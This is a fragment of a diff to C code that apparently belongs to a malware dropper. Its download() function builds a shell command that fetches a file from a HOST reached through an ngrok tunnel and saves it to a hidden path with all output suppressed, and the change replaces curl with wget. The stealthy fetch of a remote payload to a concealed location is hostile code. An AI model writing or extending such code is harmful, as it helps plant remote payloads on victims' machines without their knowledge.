@@ -152,7 +152,7 @@ int download() {
 #endif
     char command[1024];
     #define NGROK_SKIP_HEADER "--header \"ngrok-skip-browser-warning: skip-browser-warning\""
-    sprintf(command, "curl -o %s %s/%s %s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2, NGROK_SKIP_HEADER);
+    sprintf(command, "wget -O %s %s/%s %s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2, NGROK_SKIP_HEADER);
 #ifdef VERBOSE
     printf("%s\n", command);
 #endif
